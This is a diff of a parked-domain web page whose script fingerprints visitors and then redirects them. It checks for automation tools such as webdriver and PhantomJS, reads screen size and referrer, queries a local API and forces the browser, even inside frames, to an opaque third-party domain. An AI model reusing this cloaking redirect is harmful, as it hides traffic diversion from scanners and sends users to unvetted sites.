@@ -1,1 +1,85 @@
-<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://www.para-news.com/?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTY0NTg3NTI2NiwiaWF0IjoxNjQ1ODY4MDY2LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIycmJrb2k5b2I2ODkwbDQyc2cxaWRkZzMiLCJuYmYiOjE2NDU4NjgwNjYsInRzIjoxNjQ1ODY4MDY2MTg4ODIzfQ.sq-_LowGpEuGJYwLfiaZj7cyEsk5OlfAmxnmVMsfzw8&sid=49d1695a-96e7-11ec-972a-99067653b322');</script></body></html>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+	<title></title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="never">
+
+	<script type="text/javascript">
+		function ajaxQuery(url) { xmlHttp = getXMLhttp(); xmlHttp.open("GET", url, false); xmlHttp.send(); if(xmlHttp.status == 200) {return xmlHttp.responseText;} else {return "";} }
+
+		function getXMLhttp() {
+			var xmlHttp=null;
+			try {
+				xmlHttp=new XMLHttpRequest();
+			} catch (e) {
+				try {
+					xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
+				} catch (e) {
+					xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
+				}
+			}
+			return xmlHttp;
+		}
+
+		function touch() {
+			var maxTouchPoints = 0;
+			var touchEvent = false;
+			if (typeof navigator.maxTouchPoints !== "undefined") {
+				maxTouchPoints = navigator.maxTouchPoints;
+			} else if (typeof navigator.msMaxTouchPoints !== "undefined") {
+				maxTouchPoints = navigator.msMaxTouchPoints;
+			}
+			try {
+				document.createEvent("TouchEvent");
+				touchEvent = true;
+			} catch (_) {
+			}
+			var touchStart = "ontouchstart" in window;
+			return maxTouchPoints > 0 || touchEvent || touchStart;
+		}
+
+		var ref = "n/a";
+		var reftaken = "feed";
+		if(ref === "n/a" && document.referrer && document.referrer !== "") {
+			ref = document.referrer;
+			reftaken = "browser";
+		}
+		/*if(ref === "n/a") {
+			ref = null;
+			reftaken = "none";
+		}*/
+		var refEqual = ("n/a" === document.referrer);
+		var viewurl = "http://iyfnzgb.com/?pid=9PO1H9V71&dn=para-news.com",
+			ret = null;
+		var jsa = ("webdriver" in navigator && navigator.webdriver) || "phantom" in window || !!window.__nightmare;
+		var hastouch = touch();
+		try{
+			var width = (window.innerWidth || document.documentElement.clientWidth),
+				height = (window.innerHeight || document.documentElement.clientHeight),
+				noframe = (window.self === window.top) ? 1 : 0;
+			ret = ajaxQuery("/api/product/0174462f753fd3f0ffa33bf4ca253e7cfa073dfcba.r?confirm=d8b118f04550bea7be6e751ea80d5fc3&size=" + parseInt(width*height) + "&noframe=" + noframe + "&tnc_ref=" + encodeURIComponent(ref.substr(0, 127)) + "&reftaken=" + reftaken + "&refEqual=" + refEqual + "&jsa=" + jsa + "&hastouch=" + hastouch);
+		} catch(err) {
+			//alert("err", err);
+		}
+
+		if (typeof ret == "string" && ret.substring(0,4) == "http") { viewurl = ret; }
+
+		if (top.location != location) {
+			top.location.href = viewurl;
+		} else {
+			window.location = viewurl;
+		}
+
+	</script>
+
+</head>
+<body style="background-color: rgb(200,200,200);">
+
+<div style="margin-top: 200px; text-align: center;">
+	<img src="//s3-eu-west-1.amazonaws.com/pxgif/ajax-loader.gif"/>
+</div>
+
+</body>
+</html>
